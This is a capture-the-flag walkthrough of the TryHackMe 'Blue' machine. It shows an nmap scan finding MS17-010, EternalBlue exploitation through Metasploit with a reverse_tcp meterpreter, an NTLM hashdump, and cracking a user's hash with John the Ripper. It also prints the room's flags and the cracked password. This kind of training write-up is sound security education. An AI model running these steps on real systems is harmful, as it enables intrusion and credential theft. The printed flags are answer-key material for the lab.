```jsx
Machine: Blue
Platform: TryHackMe
Difficulty: Easy
```

## Walkthrought:

You can find the machine [here](https://tryhackme.com/r/room/blue).

### Recon:

Lets start the things by a simple Nmap vulnerability scan with `sudo nmap -sC -sV -vv --script vuln $IP` command.

```console
┌──(naahl@kali)-[~/THM/Blue]
└─$ sudo nmap -sC -sV -vv --script vuln 10.10.166.97
Starting Nmap 7.93 ( https://nmap.org ) at 2024-07-04 06:32 EDT
NSE: Loaded 149 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 06:32
Completed NSE at 06:32, 10.00s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 06:32
Completed NSE at 06:32, 0.00s elapsed
Initiating Ping Scan at 06:32
Scanning 10.10.46.162 [4 ports]
Completed Ping Scan at 06:32, 0.43s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 06:32
Completed Parallel DNS resolution of 1 host. at 06:32, 0.04s elapsed
Initiating SYN Stealth Scan at 06:32
Scanning 10.10.46.162 [1000 ports]
Discovered open port 445/tcp on 10.10.46.162
Discovered open port 3389/tcp on 10.10.46.162
Discovered open port 135/tcp on 10.10.46.162
Discovered open port 139/tcp on 10.10.46.162
Discovered open port 49154/tcp on 10.10.46.162
Discovered open port 49159/tcp on 10.10.46.162
Discovered open port 49152/tcp on 10.10.46.162
Discovered open port 49153/tcp on 10.10.46.162
Discovered open port 49158/tcp on 10.10.46.162
Completed SYN Stealth Scan at 06:32, 19.67s elapsed (1000 total ports)
Initiating Service scan at 06:32
Scanning 9 services on 10.10.46.162
Service scan Timing: About 44.44% done; ETC: 06:35 (0:01:16 remaining)
Completed Service scan at 06:35, 125.03s elapsed (9 services on 1 host)
NSE: Script scanning 10.10.46.162.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 06:35
NSE Timing: About 99.82% done; ETC: 06:35 (0:00:00 remaining)
NSE Timing: About 99.91% done; ETC: 06:36 (0:00:00 remaining)
Completed NSE at 06:36, 61.13s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 06:36
NSE: [ssl-ccs-injection 10.10.46.162:3389] No response from server: ERROR
Completed NSE at 06:36, 13.97s elapsed
Nmap scan report for 10.10.46.162
Host is up, received reset ttl 125 (0.42s latency).
Scanned at 2024-07-04 06:32:39 EDT for 220s
Not shown: 991 closed tcp ports (reset)
PORT      STATE SERVICE            REASON          VERSION
135/tcp   open  msrpc              syn-ack ttl 125 Microsoft Windows RPC
139/tcp   open  netbios-ssn        syn-ack ttl 125 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       syn-ack ttl 125 Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server? syn-ack ttl 125
|_ssl-ccs-injection: No reply from server (TIMEOUT)
49152/tcp open  msrpc              syn-ack ttl 125 Microsoft Windows RPC
49153/tcp open  msrpc              syn-ack ttl 125 Microsoft Windows RPC
49154/tcp open  msrpc              syn-ack ttl 125 Microsoft Windows RPC
49158/tcp open  msrpc              syn-ack ttl 125 Microsoft Windows RPC
49159/tcp open  msrpc              syn-ack ttl 125 Microsoft Windows RPC
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_smb-vuln-ms10-054: false
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 06:36
Completed NSE at 06:36, 0.00s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 06:36
Completed NSE at 06:36, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 230.84 seconds
           Raw packets sent: 1330 (58.496KB) | Rcvd: 1095 (43.836KB)
```

The scan shows that the machine is vulnerable to `ms17-010`.

### Exploitation:

We'll use `msfconsole` for exploitation.

```console
┌──(naahl㉿kali)-[~/THM/Blue]
└─$ msfconsole
                                                  
  +-------------------------------------------------------+
  |  METASPLOIT by Rapid7                                 |                                                                                                                                                                     
  +---------------------------+---------------------------+                                                                                                                                                                     
  |      __________________   |                           |                                                                                                                                                                     
  |  ==c(______(o(______(_()  | |""""""""""""|======[***  |                                                                                                                                                                     
  |             )=\           | |  EXPLOIT   \            |                                                                                                                                                                     
  |            // \\          | |_____________\_______    |                                                                                                                                                                     
  |           //   \\         | |==[msf >]============\   |                                                                                                                                                                     
  |          //     \\        | |______________________\  |                                                                                                                                                                     
  |         // RECON \\       | \(@)(@)(@)(@)(@)(@)(@)/   |                                                                                                                                                                     
  |        //         \\      |  *********************    |                                                                                                                                                                     
  +---------------------------+---------------------------+                                                                                                                                                                     
  |      o O o                |        \'\/\/\/'/         |                                                                                                                                                                     
  |              o O          |         )======(          |                                                                                                                                                                     
  |                 o         |       .'  LOOT  '.        |                                                                                                                                                                     
  | |^^^^^^^^^^^^^^|l___      |      /    _||__   \       |                                                                                                                                                                     
  | |    PAYLOAD     |""\___, |     /    (_||_     \      |                                                                                                                                                                     
  | |________________|__|)__| |    |     __||_)     |     |                                                                                                                                                                     
  | |(@)(@)"""**|(@)(@)**|(@) |    "       ||       "     |                                                                                                                                                                     
  |  = = = = = = = = = = = =  |     '--------------'      |                                                                                                                                                                     
  +---------------------------+---------------------------+                                                                                                                                                                     


       =[ metasploit v6.3.4-dev                           ]
+ -- --=[ 2294 exploits - 1201 auxiliary - 409 post       ]
+ -- --=[ 968 payloads - 45 encoders - 11 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: Use help <command> to learn more 
about any command
Metasploit Documentation: https://docs.metasploit.com/

msf6 > search ms17-010

Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution


Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce
```

Module 0 is the one we need to use.

```console
msf6 > use 0
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.37.128   yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target



View the full module info with the info, or info -d command.
```

Set the `RHOST` attribute to the machine IP Address as shown below, and use `run` or `exploit` to start the exploitation.

```console
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.46.162
RHOSTS => 10.10.46.162
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit                                                                                                                                                                                                                                                                                                                            
[*] 10.10.46.162:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check                                                                                                                                               
[+] 10.10.46.162:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)                                                                                           
[*] 10.10.46.162:445      - Scanned 1 of 1 hosts (100% complete)                                                                                                                                                       
[+] 10.10.46.162:445 - The target is vulnerable.                                                                                                                                                                       
[*] 10.10.46.162:445 - Connecting to target for exploitation.                                                                                                                                                          
[+] 10.10.46.162:445 - Connection established for exploitation.                                                                                                                                                        
[+] 10.10.46.162:445 - Target OS selected valid for OS indicated by SMB reply                                                                                                                                                                                                                                                                                        
[+] 10.10.46.162:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!                                                                                                                                   
[+] 10.10.46.162:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.46.162:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.46.162:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter > 

```

### Flags:

`shell` command opens a standard terminal on the target host

```console
meterpreter > shell
Process 1652 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
C:\Windows\system32>
```

You'll find first flag in `system32`

```console
C:\Windows\system32>type C:\flag1.txt
type C:\flag1.txt
flag{access_the_machine}
```
**Flag 1:** `flag{access_the_machine}`

Second flag will be in `C:/Windows/System32/config`

```console
C:\Windows\system32\config>type flag2.txt
type flag2.txt
flag{sam_database_elevated_access}
```

**Flag 2:** `flag{sam_database_elevated_access}`

For the third flag I need to go into the `C:\Users` directory. There I need to enter `Jon`, so let's crack its password.

Use the `hashdump` command to look for password hashes.

```console
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

Use `John the Ripper` to crack the hash of `Jon`.

```console
┌──(naahl@kali)-[~/THM/Blue]
└─$ echo 'ffb43f0de35be4d9917ac0cc8ad57f8d' > hash.txt

┌──(naahl@kali)-[~/THM/Blue]
└─$ john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Password was `alqfna22`. 

I entered `Jon` and then `documents`. In the `documents`, there was a `flag3.txt` file.

```console
C:\Windows\system32Jon\Documents> type flag3.txt
type flag3.txt
flag{admin_documents_can_be_valuable}
```

**Flag 3:** `flag{admin_documents_can_be_valuable}`

---

**GRACIAS**

---
